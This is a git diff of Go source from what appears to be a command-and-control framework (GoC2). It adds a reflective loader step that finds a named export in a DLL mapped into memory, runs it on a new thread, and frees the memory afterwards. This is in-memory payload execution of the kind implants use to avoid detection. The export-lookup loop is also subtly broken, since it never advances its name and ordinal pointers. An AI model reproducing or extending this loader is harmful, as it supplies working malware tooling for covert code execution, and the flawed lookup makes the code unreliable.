@@ -5,9 +5,9 @@ import (
 	"debug/pe"
 	"errors"
 	"fmt"
+	"log"
 	"os"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"github.com/latortuga71/GoC2/pkg/winapi"
@@ -246,8 +246,35 @@ func GetRealSectionSize(peHeader *pe.OptionalHeader64, section *pe.Section) uint
 	}
 	return 0
 }
-func CreateExportAddressTable(peHeader *pe.OptionalHeader64, memoryStart uintptr) error {
-	return nil
+func FindExportedFunction(peHeader *pe.OptionalHeader64, memoryStart uintptr, exportedFunction string) (uintptr, error) {
+	dataDirectory := peHeader.DataDirectory
+	if len(dataDirectory) == 0 {
+		return 0, fmt.Errorf("[+] Data Directory Empty")
+	}
+	exportDirectory := dataDirectory[0] // export directory is the zero index
+	exports := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(memoryStart + uintptr(exportDirectory.VirtualAddress)))
+	if exports.NumberOfNames == 0 || exports.NumberOfFunctions == 0 {
+		log.Println("Nothing Exported.")
+		return 0, nil
+	}
+	// loop over address of names to find the name
+	// looping over ordinals at the same time to match the name and ordinal
+	nameRef := (*uint32)(unsafe.Pointer(memoryStart + uintptr(exports.AddressOfNames)))
+	ordinal := (*uint16)(unsafe.Pointer(memoryStart + uintptr(exports.AddressOfNameOrdinals)))
+	for i := 0; i < int(exports.NumberOfNames); i++ {
+		// here we loop.
+		functionName := (*byte)(unsafe.Pointer(memoryStart + uintptr(*nameRef)))
+		functionIdx := *ordinal
+		// we now need to check if that name matches what we asked for.
+		functionNameString := string(ReadAsciiFromMemoryNoBase(uintptr(unsafe.Pointer(functionName))))
+		if functionNameString == exportedFunction {
+			log.Println("Found Function.")
+			functionEntryPoint := memoryStart + uintptr(*(*uint32)(unsafe.Pointer((memoryStart + uintptr(exports.AddressOfFunctions) + uintptr(functionIdx*4)))))
+			log.Printf("Exported Function Is Located HERE! -> %p", unsafe.Pointer(functionEntryPoint))
+			return functionEntryPoint, nil
+		}
+	}
+	return 0, fmt.Errorf("Function Not Found.")
 }
 func CreateImportAddressTable(peHeader *pe.OptionalHeader64, memoryStart uintptr) error {
 	dataDirectory := peHeader.DataDirectory
@@ -450,21 +477,18 @@ type RawPe struct {
 	removeHeader        bool
 	peEntry             uintptr
 	allocatedMemoryBase uintptr
+	exportedFunction    string
 	// other stuff here in the future like exports
 	// delete header flags etcs
 }
 
-func NewRawPE(peT PeType, removeDOSHeaders bool, data []byte) *RawPe {
+func NewRawPE(peT PeType, exportFunction string, data []byte) *RawPe {
 	return &RawPe{
-		peType:       peT,
-		rawData:      data,
-		peStruct:     nil,
-		removeHeader: removeDOSHeaders,
+		peType:           peT,
+		rawData:          data,
+		peStruct:         nil,
+		exportedFunction: exportFunction,
 	}
-}
-
-func (r *RawPe) FindExportedFunction(funcName string) {
-
 }
 
 func RemoveDOSHeader(baseAddress uintptr) {
@@ -550,14 +574,22 @@ func (r *RawPe) LoadPEFromMemory() (string, error) {
 	r.allocatedMemoryBase = baseAddressOfMemoryAlloc
 	switch r.peType {
 	case Dll:
+		exportEntryPoint, err := FindExportedFunction(r.peHeaders, baseAddressOfMemoryAlloc, r.exportedFunction)
+		if err != nil {
+			return "", err
+		}
+		hThread, err := winapi.CreateThread(0, 0, uintptr(exportEntryPoint), 0, 0, nil)
+		if err != nil {
+			return "", err
+		}
 		go func() {
 			// clean memory once it exits thread.
 			//windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
 			// calling dll entry point
-			syscall.Syscall(uintptr(entryPointPtr), 3, baseAddressOfMemoryAlloc, 1, 0)
-			time.Sleep(time.Second * 60)
-			syscall.Syscall(r.peEntry, 3, r.allocatedMemoryBase, 0, 0)
+			// clean memory once it exits thread.
+			windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
 			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
+			log.Println("Cleared Memory.")
 		}()
 		break
 	case Exe:
@@ -800,6 +832,20 @@ type ImageOptionalHeader32 struct {
 
 	// An array of 16 IMAGE_DATA_DIRECTORY structures.
 	DataDirectory [16]DataDirectory
+}
+
+type IMAGE_EXPORT_DIRECTORY struct {
+	Characteristics       uint32
+	TimeDateStamp         uint32
+	MajorVersion          uint16
+	MinorVersion          uint16
+	Name                  uint32
+	Base                  uint32
+	NumberOfFunctions     uint32
+	NumberOfNames         uint32
+	AddressOfFunctions    uint32 // RVA from base of image
+	AddressOfNames        uint32 // RVA from base of image
+	AddressOfNameOrdinals uint32 // RVA from base of image
 }
 
 // ImageOptionalHeader64 represents the PE32+ format structure of the optional header.
